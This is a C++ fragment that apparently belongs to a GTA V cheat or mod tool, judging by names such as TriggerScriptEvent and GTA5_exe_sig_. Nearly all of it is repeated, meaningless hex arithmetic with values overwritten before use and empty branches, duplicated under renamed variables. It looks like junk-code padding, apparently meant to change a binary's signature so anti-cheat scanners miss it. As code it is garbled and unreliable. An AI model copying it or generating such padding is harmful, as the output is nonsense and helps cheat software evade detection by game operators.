			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::LogSemHora("<ModelHash>" + to_string(Estrutura.Hash) + "</ModelHash>");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
